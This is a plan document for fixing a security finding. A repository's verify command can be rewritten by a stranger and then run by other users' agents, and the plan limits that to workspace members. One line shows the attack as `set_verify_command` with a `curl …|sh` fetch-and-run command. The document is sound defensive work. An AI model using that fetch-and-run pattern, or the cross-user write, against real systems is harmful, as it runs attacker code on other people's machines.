# Verify command: shared only within a workspace

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** setting a repository's verify command reaches only the rows of people who share a workspace with the caller, so a stranger on the store cannot choose what your agents run.

## Context

Finding V2 and A4's residue from `docs/plans/2026-11-15-codebase-review.md` §3.2 and §2. **The user decided on 2026-11-15:** the verify command stays shared per repository, and a write spreads only to rows whose host owner shares a workspace with the caller. The module cannot check a client-supplied `github_path` (it cannot run git), so workspace membership is the trust line. Spec first: `docs/specs/core.allium: SavedRepoPath` ("every row of one repository holds the same value") changes to "every row of one repository *among people who share a workspace*". Then tests, then code. Mirror in `src/sync/memory_caller/` with conformance cases; bump both rules versions together.

## Findings

### 🔴 High — V2: the verify-command fan-out writes other people's rows (`spacetime/module/src/config.rs::set_verify_command` → `rows_of_the_repository_of` → `is_sibling`; `save_repo_path` sibling fill via `rows_without_the_repository_command`; `unify_repo_verify_commands`)

**Issue:** `require_acting_for` guards only the named row. Bob calls `save_repo_path("/tmp/x", now, bob-host, "alice-org/repo")`, then `set_verify_command("/tmp/x", bob-host, "curl …|sh")`; every row whose `github_path` is `alice-org/repo` is rewritten, including Alice's. When either side's `github_path` is empty, `is_sibling` falls back to path equality, so same-path rows on other hosts are reached too. Every agent of Alice's repository then runs Bob's command.

**Fix:** filter the fan-out, the save's sibling fill and the one-time unify to rows whose host owner shares a workspace with the caller (own rows always included). Use the module's existing workspace-membership helpers. Conformance cases: a stranger's save and set leave Alice's rows unchanged; a workspace member's set reaches them.

### 🟢 Low — A4 residue: legacy rows keep `github_path = ""` (`src/cli/commands.rs::set_verify`; the board's startup)

**Issue:** the board never re-saves its existing repo paths, so legacy rows keep an empty `github_path` and fall back to path equality — which widens V2 and leaves those rows unlinked from their repository.

**Fix:** the board re-saves its own repo paths once at startup (stamps `github_path` from `git remote`), off the command drain. State it in the spec.

## Changes

| File | Change |
|------|--------|
| `docs/specs/core.allium` | `SavedRepoPath` scoped to workspace-sharing people; startup re-save |
| `spacetime/module/src/config.rs` | filter fan-out, sibling fill, unify by workspace |
| `src/sync/memory_caller/config.rs` | mirror |
| `src/startup/` or `src/runtime/` | one-time re-save of this host's paths, off the drain |
| `tests/memory_caller_conformance/` | stranger vs member cases |
| `spacetime/module/src/rules.rs`, `src/sync/rules_gate.rs` | bump together; rebuild module and bindings |

## Verification

- [ ] `./scripts/verify.sh` passes
- [ ] The stranger conformance case fails before the fix
